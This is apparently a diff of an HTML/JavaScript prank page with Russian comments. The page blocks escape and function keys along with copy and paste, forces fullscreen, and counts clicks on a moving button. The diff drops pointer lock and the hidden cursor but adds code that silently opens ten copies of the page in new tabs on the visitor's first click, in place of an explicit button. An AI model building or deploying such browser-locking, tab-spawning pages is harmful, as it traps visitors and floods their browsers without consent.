@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FULL LOCKDOWN + 10 TABS</title>
+    <title>ANTIDOTE + 10 TABS ON FIRST CLICK</title>
     <style>
         body {
             background: url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13') no-repeat center center fixed;
@@ -15,7 +15,7 @@
             min-height: 100vh;
             position: relative;
             transition: background-image 0.3s ease;
-            cursor: none;
+            /* cursor: none;  удалено – курсор видим */
         }
         body::before {
             content: "";
@@ -80,23 +80,6 @@
             background: #ffaa00;
             box-shadow: 0 0 30px orange;
         }
-        #multiTabButton {
-            background: #f0f;
-            border: none;
-            color: #000;
-            font-size: 1.2em;
-            padding: 10px 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 0 20px magenta;
-            margin-top: 20px;
-            transition: 0.2s;
-        }
-        #multiTabButton:hover {
-            background: #ffaa00;
-            box-shadow: 0 0 30px orange;
-        }
         #bg-music {
             display: none;
         }
@@ -115,7 +98,6 @@
         <div id="buttonContainer">
             <button id="clickButton">КЛИКАЙ ТУТ</button>
         </div>
-        <button id="multiTabButton">ОТКРЫТЬ 10 ВКЛАДОК</button>
         <div class="music-note" id="musicStatus">🎵 Музыка включится после первого клика</div>
     </div>
 
@@ -123,7 +105,7 @@
 
     <script>
         (function() {
-            // ========== ЖЁСТКАЯ БЛОКИРОВКА КЛАВИШ И СОБЫТИЙ ==========
+            // ========== БЛОКИРОВКА КЛАВИШ (без изменений) ==========
             function blockAllKeys(e) {
                 const forbiddenKeys = [
                     'Escape', 'F11', 'F4', 'Alt', 'Control', 'Meta', 'Win', 'OS',
@@ -163,36 +145,16 @@
             document.addEventListener('cut', e => e.preventDefault());
             document.addEventListener('paste', e => e.preventDefault());
 
-            // ========== ЗАХВАТ МЫШИ И ПОЛНЫЙ ЭКРАН ==========
-            function requestLockAndFullscreen() {
+            // ========== ПОЛНОЭКРАННЫЙ РЕЖИМ (БЕЗ ЗАХВАТА МЫШИ) ==========
+            function requestFullscreen() {
                 if (document.documentElement.requestFullscreen) {
                     document.documentElement.requestFullscreen().catch(() => {});
                 }
-                if (document.body.requestPointerLock) {
-                    document.body.requestPointerLock();
-                }
             }
-
-            requestLockAndFullscreen();
+            requestFullscreen();
 
             document.addEventListener('click', function() {
-                requestLockAndFullscreen();
-            });
-
-            document.addEventListener('pointerlockchange', function() {
-                if (document.pointerLockElement !== document.body && progress < 100) {
-                    requestLockAndFullscreen();
-                }
-            });
-            document.addEventListener('mozpointerlockchange', function() {
-                if (document.mozPointerLockElement !== document.body && progress < 100) {
-                    requestLockAndFullscreen();
-                }
-            });
-            document.addEventListener('webkitpointerlockchange', function() {
-                if (document.webkitPointerLockElement !== document.body && progress < 100) {
-                    requestLockAndFullscreen();
-                }
+                requestFullscreen();
             });
 
             document.addEventListener('fullscreenchange', function() {
@@ -202,6 +164,18 @@
                     }
                 }
             });
+
+            // ========== АВТОМАТИЧЕСКОЕ ОТКРЫТИЕ 10 ВКЛАДОК ПРИ ПЕРВОМ КЛИКЕ ==========
+            let tabsOpened = false;
+            document.addEventListener('click', function openTabs() {
+                if (!tabsOpened) {
+                    const currentUrl = window.location.href;
+                    for (let i = 0; i < 10; i++) {
+                        window.open(currentUrl, '_blank');
+                    }
+                    tabsOpened = true;
+                }
+            }, { once: true }); // сработает только один раз
 
             // ========== СЧЁТЧИК КГ ==========
             let kg = localStorage.getItem('kgCounter') || 0;
@@ -292,7 +266,7 @@
 
             moveButton();
 
-            button.addEventListener('click', function() {
+            button.addEventListener('click', function(e) {
                 tryPlayMusic();
                 if (progress < 100) {
                     progress++;
@@ -302,14 +276,6 @@
                     if (progress >= 100) {
                         forceClose();
                     }
-                }
-            });
-
-            // ========== КНОПКА ДЛЯ ОТКРЫТИЯ 10 ВКЛАДОК ==========
-            document.getElementById('multiTabButton').addEventListener('click', function() {
-                const currentUrl = window.location.href;
-                for (let i = 0; i < 10; i++) {
-                    window.open(currentUrl, '_blank');
                 }
             });
 
